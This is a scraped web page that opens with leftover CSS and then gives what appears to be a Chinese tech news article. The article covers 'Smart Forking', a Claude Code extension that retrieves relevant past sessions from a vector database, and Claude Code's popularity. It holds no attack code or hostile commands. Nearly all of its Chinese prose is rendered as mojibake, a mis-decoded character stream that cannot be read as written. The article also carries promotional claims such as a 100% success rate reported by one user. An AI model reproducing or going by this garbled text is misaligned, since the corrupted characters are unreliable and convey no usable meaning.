li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/102ab693a8a24b69bdcc4fd725803c7f~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5paw5pm65YWD:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769509883&amp;x-signature=s29CLjK9DcfHy4jYtbRoi68HxhI%3D" alt="" loading="lazy"/></p>
<h5 data-id="heading-0"><strong>ã€Œã€æ–°æ™ºå…ƒå¯¼è¯»ã€‘æ˜¨å¤©ï¼ŒClaude åˆšåˆšè¢«æ›è¦æœ‰æ°¸ä¹…è®°å¿†ï¼Œä»Šå¤©å°±è¢«å¼€å‘è€…æŠ¢å…ˆä¸€æ­¥ã€‚ä¸€ä¸ªå« Smart Forking çš„æ‰©å±•ï¼Œè®©å¤§æ¨¡å‹é¦–æ¬¡æ‹¥æœ‰ã€Œé•¿æœŸè®°å¿†ã€ï¼Œæ— éœ€é‡å¤´è§£é‡Šã€‚å¼€å‘è€…åœˆæ²¸è…¾äº†ï¼šéš¾ä»¥ç½®ä¿¡ï¼Œå®ƒçœŸçš„èƒ½è·‘ï¼ã€</strong></h5>
<p>æ˜¨å¤©ï¼Œä¸€ç¯‡ Claude è¦è·å¾—æ°¸ä¹…è®°å¿†çš„çˆ†æ–™ï¼Œéœ‡æƒŠæ•´ä¸ª AI åœˆã€‚</p>
<p>è¿™ç§ã€ŒçŸ¥è¯†åº“ã€çš„å…¨æ–°è®°å¿†æ–¹å¼ï¼Œ<a href="https://link.juejin.cn?target=https%3A%2F%2Fmp.weixin.qq.com%2Fs%3F__biz%3DMzI3MTA0MTk1MA%3D%3D%26mid%3D2652665767%26idx%3D1%26sn%3D1935acf8bbe45fbd5e6caf15d4703a32%26scene%3D21%23wechat_redirect" target="_blank" title="https://mp.weixin.qq.com/s?__biz=MzI3MTA0MTk1MA==&amp;mid=2652665767&amp;idx=1&amp;sn=1935acf8bbe45fbd5e6caf15d4703a32&amp;scene=21#wechat_redirect" ref="nofollow noopener noreferrer">å¯ä»¥è®© Claude åœ¨è‡ªå·±çš„æ°¸å­˜å¤§è„‘ä¸­ï¼Œè‡ªåŠ¨è®°ä½ä¸€åˆ‡</a>ã€‚</p>
<p>å·§çš„æ˜¯ï¼Œå°±åœ¨ä»Šå¤©ï¼Œå°±æœ‰å¼€å‘è€…æŠ¢å…ˆã€Œæˆªèƒ¡ã€ã€‚ä»–åœ¨ç°æœ‰å·¥å…·ä¸Šå®ç°äº†ä¸€ä¸ªæ‰©å±•èƒ½åŠ›â€”â€”Smart Forking detectionï¼Œè®©å¤§æ¨¡å‹ç¬¬ä¸€æ¬¡æ‹¥æœ‰äº†ã€Œå¯ç»§æ‰¿çš„é•¿æœŸè®°å¿†ã€ï¼</p>
<p>è¿™ä¸ªæ‰€è°“çš„ Smart Forkingï¼Œé€šè¿‡ç»™ Claude Code ä¼šè¯åµŒå…¥å‘é‡æ•°æ®åº“ï¼Œè®©å®ƒèƒ½ä»æˆç™¾ä¸Šåƒæ¬¡çš„å†å²å¯¹è¯ä¸­ï¼Œæ‰¾åˆ°æœ€ç›¸å…³çš„å‰æ–‡ã€‚</p>
<p>å› æ­¤ï¼Œä½ ä¸å¿…å†é‡æ–°è§£é‡Šï¼ŒClaude å¯ä»¥ç›´æ¥ã€Œæ¥ä¸Šæ–‡ã€æå¼€å‘äº†ã€‚</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/9627a2403a2e41ee9938ff26ca25cf60~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5paw5pm65YWD:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769509883&amp;x-signature=Zyv9aArusK2CCJmUY%2Bd0G8MqsU8%3D" alt="" loading="lazy"/></p>
<p>è¿™ä¸ªåŠŸèƒ½ä¸€å‡ºï¼Œå¼€å‘è€…ç¤¾åŒºç›´æ¥ç‚¸é”…äº†ã€‚å¤§å®¶çº·çº·è¡¨ç¤ºï¼šã€Œä¸æ•¢ç›¸ä¿¡ï¼Œå®ƒå±…ç„¶çœŸçš„è·‘èµ·æ¥äº†ï¼ã€ã€Œè¿™ä¸€åˆ»ï¼Œæˆ‘æ˜¯çœŸçš„è¢«éœ‡æ’¼åˆ°äº†ã€‚ã€</p>
<p>å¼ºçƒˆæ¨èæ¯ä¸€ä¸ª Claude Code ç”¨æˆ·ï¼Œéƒ½æŠŠè¿™ä¸ªæ€è·¯ç›´æ¥åŠ å…¥è‡ªå·±çš„å·¥ä½œæµï¼</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/f909824d5d4842b8af0e2c877f73b003~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5paw5pm65YWD:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769509883&amp;x-signature=jC9gfpKRO8c928UCxoI11T9ALfk%3D" alt="" loading="lazy"/></p>
<p>è‹±é›„æ‰€è§ç•¥åŒï¼Œä½†è·¯å¾„ä¸åŒã€‚å½“å®˜æ–¹è¿˜åœ¨è®¾è®¡æ°¸ä¹…è®°å¿†çš„å½¢æ€æ—¶ï¼Œå¼€å‘è€…å·²ç»ç”¨ Smart Forkingï¼Œæå‰è¿‡ä¸Šäº†ã€ŒClaude æœ‰é•¿æœŸè®°å¿†ã€çš„ç”Ÿæ´»ã€‚</p>
<p>è€Œä¸”ï¼Œæœ€è¿‘è¿™ä¸ªä¸€å¤©ç”©å‡ºä¸€ä¸ªç‹ç‚¸çš„èŠ‚å¥ï¼Œå®åœ¨å¤ªéœ‡æ’¼äº†ã€‚2026 å¼€å¹´è¿™ä¸€ä¸ªæœˆï¼ŒAnthropic çœŸæ˜¯åå‰¯å…¶å®çš„ç¡…è°·æ–° GOATï¼Œåœ¨å¼€å‘è€…åœˆæ‹¥æœ‰æ— ä¸Šçš„å½±å“åŠ›ã€‚</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/25071c5db09942edb5703dbbeafa0fb9~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5paw5pm65YWD:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769509883&amp;x-signature=qPlSbcR0w0KCPdJ%2F1dJ4tyNxcCA%3D" alt="" loading="lazy"/></p>
<p><strong>ã€Œè®©å¤§æ¨¡å‹ã€Œæ‹¥æœ‰ã€é•¿æœŸè®°å¿†ã€</strong></p>
<p>è·Ÿæ˜¨å¤© Anthropic è¢«æ›çš„å®˜æ–¹çŸ¥è¯†åº“ç›¸æ¯”ï¼Œä»Šå¤©è¿™ä¸ªåŠŸèƒ½ä¸ä»…æœ‰æ¼”ç¤ºï¼Œè¿˜æœ‰æŠ€æœ¯ç»†èŠ‚ã€‚</p>
<p>ä½ æœ‰æ²¡æœ‰é‡åˆ°è¿‡è¿™ç§æƒ…å†µï¼šæƒ³åœ¨ä¸€ä¸ªå·²æœ‰é¡¹ç›®é‡ŒåŠ æ–°åŠŸèƒ½ï¼Œä½†å®Œå…¨ä¸æƒ³å†ä»å¤´è§£é‡Šä¸€éèƒŒæ™¯ï¼Ÿ</p>
<p>é‚£æœ‰æ²¡æœ‰å¯èƒ½åˆ©ç”¨èµ·åœ¨æˆç™¾ä¸Šåƒæ¬¡ Claude Code å¯¹è¯ä¸­ç§¯ç´¯çš„çŸ¥è¯†å‘¢ï¼Ÿ</p>
<p>æ¯•ç«Ÿï¼Œä¸€ä¸ªå¯¹è¯é‡ŒåŒ…å«çš„æœ‰æ•ˆä¸Šä¸‹æ–‡è¶Šå¤šï¼ŒClaude å®ç°éœ€æ±‚çš„æ•ˆæœå°±è¶Šå¥½ã€‚æ€æ ·æ‰èƒ½è®©è¿™äº›å®è´µçš„ä¸Šä¸‹æ–‡ä¿¡æ¯ï¼Œä¸è¦ç™½ç™½æµªè´¹äº†ï¼Ÿ</p>
<p>è¿™ä½å¼€å‘è€…æƒ³åˆ°ä¸€ä¸ªåŠæ³•â€”â€”smart forkingï¼ˆæ™ºèƒ½åˆ†å‰ï¼‰ï¼</p>
<p>åªéœ€è¦è°ƒç”¨Â <code>/fork-detect</code>Â å‘½ä»¤ï¼Œå‘Šè¯‰å®ƒä½ ç°åœ¨æƒ³åšä»€ä¹ˆï¼ŒClaude å°±ä¼šæŠŠä½ çš„éœ€æ±‚é€è¿›åµŒå…¥æ¨¡å‹ï¼›ç„¶åï¼Œå’Œä¸€ä¸ª**ã€ŒåŒ…å«ä½ æ‰€æœ‰å†å²èŠå¤©è®°å½•çš„ RAG å‘é‡æ•°æ®åº“ã€**è¿›è¡ŒåŒ¹é…ï¼ˆè€Œä¸”ï¼Œè¿™ä¸ªæ•°æ®åº“ä¼šéšç€ä½ æ–°çš„ä¼šè¯è‡ªåŠ¨æ›´æ–°ï¼‰ã€‚</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/391859f566f04d82b7998b341990ebf1~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5paw5pm65YWD:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769509883&amp;x-signature=0xka7pIdx8fsV%2FaIh%2B%2BSW6KqQGw%3D" alt="" loading="lazy"/></p>
<p>æ¥ç€ï¼Œå®ƒä¼šè¿”å›ä¸€ä¸ª**ã€Œä¸ä½ å½“å‰éœ€æ±‚æœ€ç›¸å…³çš„å‰ 5 ä¸ªå†å²ä¼šè¯ã€**ï¼Œå¹¶ä¸ºæ¯ä¸€ä¸ªæ‰“ä¸Šç›¸å…³åº¦è¯„åˆ†ï¼Œä»é«˜åˆ°ä½æ’åºã€‚</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/9f4b3e15feda4504a1f79c8a7c43fd0f~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5paw5pm65YWD:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769509883&amp;x-signature=Pz2ZS4GZJqaPazf%2F2o3YmX82zd4%3D" alt="" loading="lazy"/></p>
<p>ä½ åªéœ€è¦é€‰ä¸€ä¸ªæœ€åˆé€‚çš„ä¼šè¯ï¼Œå®ƒå°±ä¼šç›´æ¥ç»™ä½ ä¸€æ¡ fork å‘½ä»¤ï¼Œå¤åˆ¶ã€ç²˜è´´åˆ°æ–°çš„ç»ˆç«¯é‡Œã€‚</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/24a5b1fdcf094f88bf1c704633036a8f~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5paw5pm65YWD:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769509883&amp;x-signature=ZCXt10oLN%2FzNrJTOSgySGqmXabk%3D" alt="" loading="lazy"/></p>
<p>è¿™æ ·ï¼Œä½ å°±èƒ½åœ¨æœ€åˆé€‚çš„ä¸Šä¸‹æ–‡ä¸­ï¼Œæ— ç¼ç»§ç»­å¼€å‘äº†ã€‚åŠŸèƒ½å®ç°ï¼Œä»æ­¤å˜å¾—å¼‚å¸¸ä¸æ»‘ï¼</p>
<p><strong>ã€Œ<img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/bcc9a77e30fa4590b088e5d304cc7de7~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5paw5pm65YWD:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769509883&amp;x-signature=PF5gJB2Bcy242XNC035Pvc9ufnw%3D" alt="" loading="lazy"/>ã€</strong></p>
<p><strong>ã€Œå®æµ‹ä½“éªŒï¼šæˆåŠŸç‡ 100%ã€</strong></p>
<p>è¿™æ ·çœ‹æ¥ï¼ŒSmart Forkingï¼Œæœ¬è´¨ä¸Šæ˜¯ç»™å¤§æ¨¡å‹å¤–æŒ‚äº†ä¸€å¥—ã€Œè®°å¿†ç³»ç»Ÿã€ã€‚</p>
<p>å½“ç„¶ï¼Œå¦‚æœè¦ä¸¥è°¨ä¸€ç‚¹è¯´ï¼ŒSmart Forking å¹¶æ²¡æœ‰æ”¹å˜æ¨¡å‹çš„è®°å¿†æœºåˆ¶ï¼Œè€Œæ˜¯é€šè¿‡å‘é‡æ£€ç´¢ï¼ŒæŠŠå†å²ä¸Šä¸‹æ–‡å˜æˆäº†ä¸€ç§å¤–ç½®çš„é•¿æœŸè®°å¿†ã€‚</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/8588539edf334930886be6d9162ac63a~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5paw5pm65YWD:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769509883&amp;x-signature=omPRyq%2FbH6I1LHXecngl4kXGvwk%3D" alt="" loading="lazy"/></p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/a898bfe4cd594e55beae8a7e790801a2~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5paw5pm65YWD:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769509883&amp;x-signature=rMm7BoAL4jzz3ZWulT7qDxuHwYI%3D" alt="" loading="lazy"/></p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/96ad7ed13e7d4530971d214f77052158~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5paw5pm65YWD:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769509883&amp;x-signature=ZCTJgnik4rcKeGGfy3R1qRSIbgI%3D" alt="" loading="lazy"/></p>
<p>ä¸è¿‡ä»ä½¿ç”¨ä½“éªŒä¸Šæ¥è¯´ï¼Œä½ ä¸éœ€è¦é‡å¤è¾“å…¥ï¼Œä¸ç”¨è‡ªå·±å›å¿†ï¼Œæ¨¡å‹å°±èƒ½ã€Œæƒ³èµ·ã€ä½ å‡ ä¸ªæœˆå‰åšè¿‡ä»€ä¹ˆï¼Œè¿™å·²ç»æ»¡è¶³äººç±»å¯¹ã€Œè®°å¿†ã€çš„å…¨éƒ¨ç›´è§‰å®šä¹‰äº†ã€‚</p>
<p>æ‰€ä»¥å¯ä»¥è¯´ï¼Œå®ƒè®© Claude æ‹¥æœ‰äº†ã€Œæ°¸ä¹…è®°å¿†ã€ã€‚</p>
<p>å’Œæ™®é€šæç¤ºç›¸æ¯”ï¼ŒæˆåŠŸç‡åˆ°åº•å¦‚ä½•ï¼Ÿè¿™ç§æ–¹æ³•é€‚ç”¨äºå“ªäº›ä½¿ç”¨åœºæ™¯ï¼Ÿ</p>
<p>åˆ†äº«è¿™ä¸€æ–¹æ³•çš„ç½‘å‹ Zac ä»‹ç»ï¼Œä»–ä¸ªäººä½¿ç”¨æ—¶ï¼ŒæˆåŠŸç‡ä¸º 100%ã€‚</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/41828cb78e264337b57694be355562f1~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5paw5pm65YWD:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769509883&amp;x-signature=TM6zUFFAqoZDjGdA8G2cV73dbTs%3D" alt="" loading="lazy"/></p>
<p>æœ‰äººè´¨ç–‘è¯´ï¼Œè¿™ä¸ªåŠŸèƒ½æ¯”èµ· skills å¥½åœ¨å“ªé‡Œï¼Ÿ</p>
<p>å…³é”®åœ¨äºï¼ŒSmart forking è§£å†³äº†ç›®å‰ LLM ä¼šè¯æœ€å¤§çš„ç—›ç‚¹â€”â€”ä¸Šä¸‹æ–‡ä¸¢å¤±ï¼Œè¿™æ ·ï¼Œå°±èƒ½è‡ªåŠ¨ç”Ÿå‡ºæ­£ç¡®çš„å¯¹è¯äº†ã€‚</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/e98902fbd36f440386da86ff3e4dd898~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5paw5pm65YWD:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769509883&amp;x-signature=tpuVuw%2F2nuLaB392Y4OLz7ef8DM%3D" alt="" loading="lazy"/></p>
<p>è¿™å°±æ˜¯ AI å¸¦ç»™å¤§å®¶çš„åˆä¸€ä¸ªæƒŠå–œâ€”â€”æ­¤åï¼Œæ¯æ¬¡å’Œ AI å¯¹è¯ä¸­çš„æ™ºæ…§å¾—ä»¥ä¿ç•™ï¼›äº‹åŠåŠŸå€ï¼Œã€Œæ‡’äººã€æ±‚ä¹‹ä¸å¾—ï¼</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/9f5a6fa3fc5c438da8598a5e3521bd39~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5paw5pm65YWD:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769509883&amp;x-signature=bSTrYGlKRvKNLN%2FDU6K99q0qqb8%3D" alt="" loading="lazy"/></p>
<p><strong>ã€Œ<img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/3c5fc213179c454d9ae7a41880ec35b7~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5paw5pm65YWD:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769509883&amp;x-signature=u5Di0Ju6K4dNuCI%2BmCXBdK7Cv8g%3D" alt="" loading="lazy"/>ã€</strong></p>
<p><strong>ã€Œé‡ç”Ÿå¼€å‘è€… vs å®˜æ–¹ï¼Œå“ªä¸ªå¼ºã€</strong></p>
<p>æ‰€ä»¥ï¼Œè¿™ç§ Smart Forkingï¼Œå’Œä¼ è¯´ä¸­ Anthropic å®˜æ–¹è¦åšçš„ã€Œæ°¸ä¹…å¤§è„‘ã€çŸ¥è¯†åº“ï¼Œå­°ä¼˜å­°åŠ£å‘¢ï¼Ÿ</p>
<p>å¯ä»¥çœ‹åˆ°ï¼Œçˆ†æ–™ä¸­ Anthropic è¦åšçš„ã€ŒçŸ¥è¯†åº“ã€ï¼ŒåŸç†å°±æ˜¯æŠŠä¿¡æ¯åˆ†é—¨åˆ«ç±»å­˜è¿›ä¸åŒçš„ã€Œè®°å¿†æœ¬å­ã€ï¼Œè®© Claude ä¸»åŠ¨å»ç¿»è¿™äº›çŸ¥è¯†åº“ï¼Œè°ƒå–ç›¸å…³èƒŒæ™¯ï¼Œè¡¥å……æ–°çš„åå¥½ã€å†³ç­–å’Œç»éªŒã€‚</p>
<p><a title="" ref="nofollow noopener noreferrer" href="https://link.juejin.cn?target=">è§†é¢‘è¯¦æƒ…</a></p>
<p>å› æ­¤ï¼Œä»è®¾è®¡ç†å¿µä¸Šçœ‹ï¼Œè¿™å¥—çŸ¥è¯†åº“æ›´åƒæ˜¯**è‡ªä¸Šè€Œä¸‹çš„ã€Œç»“æ„åŒ–é•¿æœŸè®°å¿†ã€â€”â€”**ç”± Anthropic å®˜æ–¹å®šä¹‰è§„åˆ™ï¼Œç”¨æˆ·æŒ‰åœºæ™¯é€‰æ‹©ä½¿ç”¨å“ªä¸ªçŸ¥è¯†åº“ï¼Œè®© Claude æ›´æ¸…æ¥šä½ åœ¨å¹²ä»€ä¹ˆã€‚</p>
<p>è€Œ Smart Forking ä¸ä¹‹æ°æ°ç›¸åï¼Œæ˜¯ä¸€ç§**ã€Œè‡ªä¸‹è€Œä¸Šçš„ã€Œä¸Šä¸‹æ–‡ç»§æ‰¿ã€ã€‚ã€**</p>
<p>å®ƒä¸ä¾èµ–å®˜æ–¹è®°å¿†ç³»ç»Ÿï¼Œè€Œæ˜¯ç›´æ¥ä»ä½ è¿‡å»çœŸå®å‘ç”Ÿè¿‡çš„ Claude Code ä¼šè¯ä¸­ï¼Œè‡ªåŠ¨æ‰¾å‡ºæœ€ç›¸å…³çš„ä¸€æ¬¡ï¼Œç„¶åå®Œæ•´ç»§æ‰¿é‚£æ®µä¸Šä¸‹æ–‡ç»§ç»­å¹²æ´»ã€‚</p>
<p>å‰è€…æ˜¯æŠŠè®°å¿†æ•´ç†å¥½ï¼Œå†å–‚ç»™æ¨¡å‹ï¼›åè€…æ˜¯ç›´æ¥æ‰¾åˆ°æœ€è¯¥è¢«è®°ä½çš„é‚£æ®µè®°å¿†ã€‚</p>
<p>æœ‰è¶£çš„æ˜¯ï¼Œè¿™ä¸¤ç§è·¯çº¿å¹¶ä¸å†²çªï¼Œç”šè‡³ææœ‰å¯èƒ½åœ¨æœªæ¥èåˆã€‚</p>
<p>åŸå› åœ¨äºï¼ŒçŸ¥è¯†åº“è§£å†³çš„æ˜¯ã€Œé•¿æœŸã€ç¨³å®šã€å¯å¤ç”¨çš„è®°å¿†ã€ï¼Œè€Œ Smart Forking è§£å†³çš„æ˜¯ã€Œå¼ºä¸Šä¸‹æ–‡ã€å¼ºæ—¶åºçš„å·¥ä½œè®°å¿†ã€ã€‚ä¸€ä¸ªæ˜¯ Claude çš„é•¿æœŸè®°å¿†ï¼Œä¸€ä¸ªæ›´æ¥è¿‘äººç±»çš„æƒ…æ™¯è®°å¿†ã€‚</p>
<p>è¿™ä¸€æ¬¡å®˜æ–¹å’Œä¸ªäººå¼€å‘è€…ä¸çº¦è€ŒåŒçš„å°è¯•ï¼Œæˆ–è®¸å·²ç»é€éœ²å‡ºè¿™æ ·ä¸€ä¸ªäº‹å®ï¼šä¸‹ä¸€ä»£ AI çš„åˆ†æ°´å²­ï¼Œä¸æ˜¯å‚æ•°è§„æ¨¡ï¼Œè€Œæ˜¯è®°å¿†çš„ç»„ç»‡æ–¹å¼ã€‚</p>
<p>è€Œè¿™ä¸ªæ–°æ–¹æ³•åªæ˜¯æœ€è¿‘ Claude ç‹‚çƒ­çš„æœ€æ–°ä¾‹å­ã€‚</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/75810a59986548b8bfe66a86d1591b5a~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5paw5pm65YWD:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769509883&amp;x-signature=sOZTefzDoi3ohMD0veuffVHGLRw%3D" alt="" loading="lazy"/></p>
<p><strong>ã€ŒClaude Code ç ´åœˆã€</strong></p>
<p><strong>ã€Œç å†œæƒŠå‘¼ã€Œå¤ªææ€–ã€ã€</strong></p>
<p>ç›¸ä¿¡ä½ è‚¯å®šå·²ç»æ„Ÿå—åˆ°ï¼Œæœ€è¿‘ Claude ç»™å…¨ä¸–ç•Œçš„ä¸€æ³¢æ³¢æš´å‡»ã€‚</p>
<p>ã€Šåå°”è¡—æ—¥æŠ¥ã€‹æ˜¯è¿™æ ·æè¿°çš„ï¼š</p>
<p>Anthropic çš„ Claude æ­£ä»¥é›·éœ†ä¹‹åŠ¿å¸­å· AI é¢†åŸŸï¼ŒæˆåŠŸç ´åœˆï¼Œå¸­å·å…¨æ°‘ï¼</p>
<p>å¼€å‘è€…ä¸ä¸šä½™çˆ±å¥½è€…çº·çº·æƒŠå¹ï¼šClaude Code çš„ç—…æ¯’å¼ä¼ æ’­ç››å†µï¼Œå ªæ¯”ç”Ÿæˆå¼ AI é™ä¸´çš„å²è¯—æ—¶åˆ»ï¼</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/6d2f4a5675784feeb276e684ee46fda4~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5paw5pm65YWD:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769509883&amp;x-signature=aY6mMuJ729W1nU9Fu%2BDEZLLAFFU%3D" alt="" loading="lazy"/></p>
<p>ä¸æ­¢æ˜¯ç¾å›½ï¼ŒClaude Code åœ¨è‹±å›½ä¹Ÿå¼•èµ·äº†éš¾ä»¥ç½®ä¿¡çš„è½°åŠ¨ã€‚</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/8f97a2f062804aa6a356e5ce414591c8~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5paw5pm65YWD:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769509883&amp;x-signature=6GHe%2FklKoIjWQWeTMcetE5m5WOg%3D" alt="" loading="lazy"/></p>
<p>ç¾å›½äººæŠŠè¿™ç§ç°è±¡å«ä½œã€ŒClaude å…¥å‘ã€ï¼ˆClaude-pilledï¼‰ã€‚</p>
<p>è¿™ä¸ªè¯æ˜¯æŒ‡è½¯ä»¶å·¥ç¨‹å¸ˆã€é«˜ç®¡å’ŒæŠ•èµ„äººæŠŠå·¥ä½œäº¤ç»™ Claudeï¼Œç„¶åäº²çœ¼è§è¯äººç”Ÿä¸­éš¾å¿˜ä¸€åˆ»ï¼š</p>
<p>å³ä½¿åœ¨è¿™ä¸ªå¼ºäººå·¥æ™ºèƒ½å·¥å…·éåœ°å¼€èŠ±çš„æ—¶ä»£ï¼Œä»–ä»¬ä»ä¼šç›®ç¹è¿™å°æ€ç»´æœºå™¨çš„æƒŠäººèƒ½åŠ›ã€‚</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/40c35736f598401caa04284ed09282f6~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5paw5pm65YWD:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769509883&amp;x-signature=0xsuiUhEffiuxBD53eOdZvhXkRs%3D" alt="" loading="lazy"/></p>
<p>ä¸å°‘ç¨‹åºå‘˜å‡æœŸé‡Œç›´æ¥ã€ŒClaude ä¸Šå¤´ã€ï¼Œç‹‚æµ‹ Anthropic æœ€æ–°æ¨¡å‹ Claude Opus 4.5 çš„æœ¬äº‹ï¼›ä»–ä»¬éƒ½è¿·ä¸Š Claude Code è¿™ä¸ªæ¡Œé¢ç¼–ç¨‹å·¥å…·ã€‚</p>
<p>ç§‘æŠ€å…¬å¸æŠŠä»£ç  AI çº³å…¥å·¥ä½œæµå·²ç»å¥½å¤šå¹´äº†ã€‚ä»¥å‰ï¼ŒAI å¸¸è¢«æ‹¿æ¥è·Ÿåˆçº§è½¯ä»¶å·¥ç¨‹å¸ˆæ¯”ã€‚</p>
<p>ä½†è¿™æ¬¡ Claude æœ€æ–°ç‰ˆæœ¬ä¸€é¸£æƒŠäººã€éåŒå‡¡å“ã€‚</p>
<p>äº‘è®¡ç®—å·¨å¤´ Vercel çš„é¦–å¸­æŠ€æœ¯å®˜ Malte Ubl è¯´ï¼Œä»–ç”¨ä¸€å‘¨å°±æå®šäº†ä¸€ä¸ªå¤æ‚é¡¹ç›®ï¼Œä½†è¦æ˜¯æ²¡ AIï¼Œä»–å¤§æ¦‚å¾—å¹²ä¸Šä¸€å¹´ã€‚</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/70e8529300644acebe20482ec95b5904~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5paw5pm65YWD:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769509883&amp;x-signature=VYIeP8JTICU8heZFDek0D0KMVzA%3D" alt="" loading="lazy"/></p>
